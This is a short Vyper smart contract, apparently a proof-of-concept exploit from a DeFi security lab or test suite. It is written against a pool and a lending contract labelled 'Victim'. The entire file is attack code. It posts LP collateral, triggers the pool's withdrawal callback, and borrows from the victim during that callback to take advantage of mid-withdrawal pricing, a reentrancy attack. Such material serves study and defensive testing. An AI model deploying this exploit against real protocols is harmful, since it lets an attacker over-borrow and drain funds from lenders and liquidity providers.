# pragma version ^0.4.0

interface Pool:
    def remove_liquidity_with_callback(_burn_amount: uint256, _callback: address): nonpayable

interface Victim:
    def deposit_lp(_amount: uint256): nonpayable
    def borrow(_amount: uint256): nonpayable
    def debt(_user: address) -> uint256: view
    def max_borrow(_user: address) -> uint256: view

pool: public(address)
victim: public(address)
borrow_amount: public(uint256)

@deploy
def __init__(_pool: address, _victim: address):
    self.pool = _pool
    self.victim = _victim

@external
def prepare_collateral(_amount: uint256):
    extcall Victim(self.victim).deposit_lp(_amount)

@external
def attack(_burn_amount: uint256, _borrow_amount: uint256):
    self.borrow_amount = _borrow_amount
    extcall Pool(self.pool).remove_liquidity_with_callback(_burn_amount, self)

@external
def on_callback():
    extcall Victim(self.victim).borrow(self.borrow_amount)

@external
def borrow_directly(_amount: uint256):
    extcall Victim(self.victim).borrow(_amount)